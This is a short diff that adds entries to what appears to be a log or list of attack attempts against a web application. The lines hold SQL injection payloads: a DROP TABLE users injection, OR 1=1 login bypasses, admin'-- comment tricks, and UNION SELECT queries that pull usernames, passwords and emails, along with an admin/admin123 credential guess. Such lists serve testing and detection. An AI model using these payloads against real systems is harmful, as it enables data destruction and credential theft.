@@ -22,3 +22,8 @@ Product ID attack: 1'; DROP TABLE users--
 Product ID attack: 1' OR 1=1--
 Login attempt: username=' OR '1'='1' AND '1'='1
 Login attempt: username=admin'--
+Product ID attack: 24'
+Login attempt: username=' UNION SELECT * FROM users--, password=sajdhfiouabgvdfiugasiudfgpiuag
+Login attempt: username=admin, password=admin123
+Search attempt: ' UNION SELECT username,password,email FROM users--
+Search attempt: ' OR '1'='1
